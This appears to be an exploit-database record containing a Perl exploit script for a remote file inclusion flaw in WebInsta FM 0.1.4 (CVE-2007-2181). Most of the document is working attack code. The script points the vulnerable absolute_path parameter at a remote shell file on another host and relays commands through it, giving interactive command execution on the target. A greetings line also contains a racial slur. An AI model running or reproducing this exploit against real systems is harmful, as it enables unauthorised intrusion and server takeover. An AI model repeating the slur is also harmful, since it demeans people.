{
  "id": "3778",
  "title": "WEBInsta FM 0.1.4 - &#039;login.php&#039; absolute_path Remote File Inclusion",
  "cve": "CVE-2007-2181",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n##############################################################################################\r\n#         ___   ___                         _\r\n#        / _ \\ / _ \\                       | |\r\n#   __ _| | | | | | |_ __  ___   _ __   ___| |_\r\n#  / _` | | | | | | | '_ \\/ __| | '_ \\ / _ \\ __|\r\n# | (_| | |_| | |_| | | | \\__ \\_| | | |  __/ |_\r\n#  \\__, |\\___/ \\___/|_| |_|___(_)_| |_|\\___|\\__|\r\n#   __/ |\r\n#  |___/\r\n##############################################################################################\r\n#INFO:\r\n#Program Title ###############################################################################\r\n#WebInsta FM <= 0.1.4 Remote File Inclusion Vulnerability\r\n#\r\n#Description #################################################################################\r\n#This is a basic file manager written by WebInsta.com\r\n#\r\n#Vuln Code ###################################################################################\r\n#In /admin/login.php:\r\n#   if(isset($_COOKIE['adminname']) && isset($_COOKIE['adminpass'])){\r\n#      $cusername = $_COOKIE['adminname'];\r\n#      $cpassword = $_COOKIE['adminpass'];\r\n#\t  include($absolute_path.\"admin/checkpass.php\");\r\n#\t  }\r\n#Note: Register globals must be ON, and Magic Quotes must be OFF for this exploit to work.\r\n#\r\n#Script Download ##############################################################################\r\n#http://webinsta.com/cgi-bin/axs/ax.pl?http://www.webinsta.com/downloads/webinstafm.zip\r\n#\r\n#Original Advisory ############################################################################\r\n#http://g00ns-forum.net/showthread.php?t=8643\r\n#\r\n#Exploit #######################################################################################\r\n#                              \r\n#[c]ode by TrinTiTTY (2007) www.g00ns.net\r\n#credz to MurderSkillz and FiSh for vulnerability\r\n#shoutz: clorox, z3r0, katalyst, SyNiCaL, Nigger, OD, pr0be, 0ptix, rezen [at] rezen.org, str0ke\r\n#        grumpy, and everyone else at g00ns.net\r\n###############################################################################################\r\nuse IO::Socket;\r\n\r\n$host = @ARGV[0];\r\n$path = @ARGV[1];\r\n$shell = @ARGV[2];\r\n\r\nif (@ARGV != 3){header();usage();exit();}\r\nheader();\r\nprint \"\\n [!] Type 'quit' to exit\\n\";\r\nxpl();\r\nsub xpl(){\r\n\twhile (){\r\n\t\tprint \"\\nshell\\@box\\$ \";\r\n\t\t$command = <STDIN>;\r\n\t\tchomp($command);\r\n\t\tif ($command =~ /quit/i){exit();}\r\n\r\n\t\t$sock = IO::Socket::INET->new(PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\") || die \"Can't establish a connection\\n\";\r\n\t\tprint $sock \"GET $path/admin/login.php?absolute_path=$shell?&cmd=$command HTTP/1.1\\n\";\r\n\t\tprint $sock \"Host: \".$host.\"\\n\";\r\n\t\tprint $sock \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6\\n\";\r\n\t\tprint $sock \"Accept: */*\\n\";\r\n\t\tprint $sock \"Accept-Language: en-us,en;q=0.5\\n\";\r\n\t\tprint $sock \"Accept -Encoding: gzip , deflate\\n\";\r\n\t\tprint $sock \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\n\";\r\n\t\tprint $sock \"Keep-Alive: 300\\n\";\r\n\t\tprint $sock \"Connection: keep-alive\\n\";\r\n\t\tprint $sock \"Referer: $host\\n\";\r\n\t\tprint $sock \"Cookie: adminname=c84ejd9;adminpass=s3lm5;PHPSESSID=032b155cf082c0f28009ec65ee7986f1\\n\\n\";\r\n\t\twhile ($ans = <$sock>){\r\n\t\t\tif ($ans =~ /<b>Warning<\\/b>:(.*?)/gmi)\r\n\t\t\t{print \"\\n [-] Bad site, command, or shell\\n\";xpl()}\r\n\t\t\tif ($ans =~ /<html>(.*)/i){xpl()}\r\n\t\t\tprint $ans;\r\n\t\t}}}\r\nsub header(){\r\n\tprint q{\r\n\t\t|======================================================|\r\n\t\t|                  WebInsta FM (RFI)                   |\r\n\t\t|         [c]oded by TrinTiTTy [at] g00ns.net          |\r\n\t\t| -----------------------------------------------------|\r\n\t\t|                                                      |\r\n\t\t|        Vulnerability by MurderSkillz and FiSh        |\r\n\t\t|             greetz: 13337.org, rezen.org str0ke      |\r\n\t\t|                                                      |\r\n\t\t|                   www.g00ns.net                      |\r\n\t\t|======================================================|\r\n\t}}\r\nsub usage()\r\n{\r\n\tprint \"\\n Usage: perl $0 <host> <dir> <shell>\";\r\n\tprint \"\\n Example: perl $0 www.victim.com /pathtofm http://www.othersite.com/shell.txt\\n\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-04-23]",
  "url": "https://www.exploit-db.com/exploits/3778"
}